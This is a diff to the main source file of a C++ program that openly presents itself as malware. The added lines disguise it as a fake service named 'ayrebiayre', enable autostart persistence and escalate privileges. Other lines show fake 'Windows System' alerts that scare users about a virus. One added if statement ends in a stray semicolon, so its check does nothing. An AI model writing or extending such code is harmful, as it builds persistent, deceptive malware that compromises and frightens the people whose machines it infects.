@@ -3,17 +3,28 @@
 #include "../EvasionTools.h"
 #include "../DiskTools.h"
 #include "../UITools.h"
+#include "../DominationTools.h"
 
 using std::cout;
 
 
 EvasionTools 	Evador;
-DataTools	Disk;
+DiskTools	Disk;
+DominationTools Dominator;
 RuntimeTools	Runner;
 UITools		Interactor;
 
 int main(MALWARE_ENTRY){
 	cvinit(MALWARE_INIT);
+
+	SetMalwareMode(OFF);
+
+	SetMalwareFakeDescription("Mother");
+	SetMalwareFakeService("ayrebiayre");
+
+	Dominator.EnableAutoStart();
+	if ( Dominator.DisableAutoStart() != SUCCEED );
+		printf("Mother\n");
 
 	Interactor.MessageUser("Hello I Am A Malware", "But Really You're Infected With Cran ?!");
 	Interactor.InformateUser("Windows System", "We Are Trying To Remove The Virus, but you should restart");
@@ -21,6 +32,7 @@ int main(MALWARE_ENTRY){
 	Interactor.WarnUser("Windows System", "We Detected A Virus, Please Restart The Computer!");
 	Interactor.ErrorUser("Windows System", "Virus Is Eating Your files!");
 
+	Dominator.EscalatePrivileges();
 
 /*
 	if(Evador.MoveIntoMemory())
